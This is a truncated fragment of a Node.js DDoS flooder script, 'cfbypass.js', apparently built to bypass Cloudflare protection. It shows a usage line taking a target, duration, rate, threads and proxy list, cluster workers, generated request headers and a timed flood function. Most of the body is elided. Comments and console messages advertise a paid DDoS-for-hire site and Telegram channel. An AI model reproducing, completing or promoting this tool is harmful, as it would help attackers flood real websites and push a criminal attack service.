// Buy a working DDoS tool from https://stresstest.me/ / https://t.me/stresstestme
...
const { HeaderGenerator } = require('header-generator');
 ...
 if (process.argv.length < 7){console.log(`node cfbypass.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  ...
  console.log("Attack started. Leaked by https://stresstest.me/  ")
...
headers["Referer"] = Ref;
 ...
 function runFlooder() {
    ...
    setTimeout(function(){
      console.log('https://stresstest.me/')
      process.exit(1);
    }, process.argv[3] * 1000);
